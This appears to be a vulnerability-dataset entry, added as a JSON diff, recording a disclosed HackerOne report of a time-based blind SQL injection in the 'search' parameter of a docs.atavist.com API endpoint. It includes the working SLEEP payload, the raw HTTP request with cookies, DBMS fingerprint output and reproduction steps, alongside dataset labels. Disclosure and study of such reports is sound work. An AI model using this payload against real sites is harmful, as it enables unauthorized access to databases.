@@ -1,0 +1,42 @@
+{
+  "reported_to": "Automattic",
+  "reported_by": "lu3ky-13 ",
+  "title": "Sql injection on docs.atavist.com",
+  "content": "\nhello dear team\nI have found SQL injection on docs.atavist.com\nurl:http://docs.atavist.com/reader_api/stories.php?limit=10&offset=20&organization_id=88822&search=0&sort=\nparameters: injectable search=0\nCode 210 Bytes\n1Parameter: search (GET)\n2    Type: AND/OR time-based blind\n3    Title: MySQL >= 5.0.12 AND time-based blind\n4    Payload: limit=10&offset=20&organization_id=88822&search=0' AND SLEEP(5) AND 'wRIg' LIKE 'wRIg&sort=\nCode 117 Bytes\n1[20:54:30] [INFO] the back-end DBMS is MySQL\n2web application technology: Apache 2.2.34\n3back-end DBMS: MySQL >= 5.0.12\nRequest\nCode 581 Bytes\n1GET /reader_api/stories.php?limit=10&offset=20&organization_id=88822&search=0&sort= HTTP/1.1\n2Host: docs.atavist.com\n3User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0\n4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\n5Accept-Language: en-US,en;q=0.5\n6Accept-Encoding: gzip, deflate\n7Connection: close\n8Cookie: _fbp=fb.1.1605829485735.1219501220; __stripe_mid=f950034a-6de5-408c-b227-5ef48058f129d296dd; rgisanonymous=true; rguserid=5625868d-bfff-49dc-90ac-0269e5138dc8; rguuid=true\n9Upgrade-Insecure-Requests: 1\n10\n11\n43.PNG (F1087069): 43.PNG\nthe website in scope other report\nhttps://hackerone.com/reports/950881\nImpact\nUse parameterized queries when dealing with SQL queries that contains user input. Parameterized queries allows the database to understand which parts of the SQL query should be considered as user input, therefore solving SQL injection.\n\n",
+  "severity": [
+    7.0,
+    8.9
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "SQL Injection"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1607437920,
+  "report_url": "https://hackerone.com/reports/1039315",
+  "vuln_category": "API",
+  "is_multi_component": true,
+  "complexity": "MEDIUM",
+  "novelty": "MEDIUM",
+  "steps": [
+    [
+      1,
+      "Navigate to http://docs.atavist.com/reader_api/stories.php?limit=10&offset=20&organization_id=88822&search=0&sort="
+    ],
+    [
+      2,
+      "Modify the 'search' parameter to include a SQL injection payload, e.g., search=0' AND SLEEP(5) AND 'wRIg' LIKE 'wRIg"
+    ]
+  ],
+  "vuln_description": "The vulnerability is a time-based SQL injection in the 'search' parameter of the stories.php endpoint. This allows an attacker to execute arbitrary SQL queries on the backend MySQL database, potentially leading to data leakage or other malicious actions.",
+  "reason": "The attack involves a straightforward SQL injection with no complex interactions between components or novel logic. The vulnerability is discovered by simple parameter manipulation and observing delayed responses.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": "950881",
+  "authnz_metadata": {
+    "reason": "The SQL injection vulnerability involves direct manipulation of the 'search' parameter in the SQL query, which is a user input. The proposed methodologies focus on authentication and authorization bypasses (AuthN/AuthZ) and Insecure Direct Object References (IDOR), not SQL injection. SQL injection is a separate vulnerability class that requires testing for improper input sanitization in database queries, which is not covered by the described methodologies.",
+    "is_detectable": false
+  }
+}
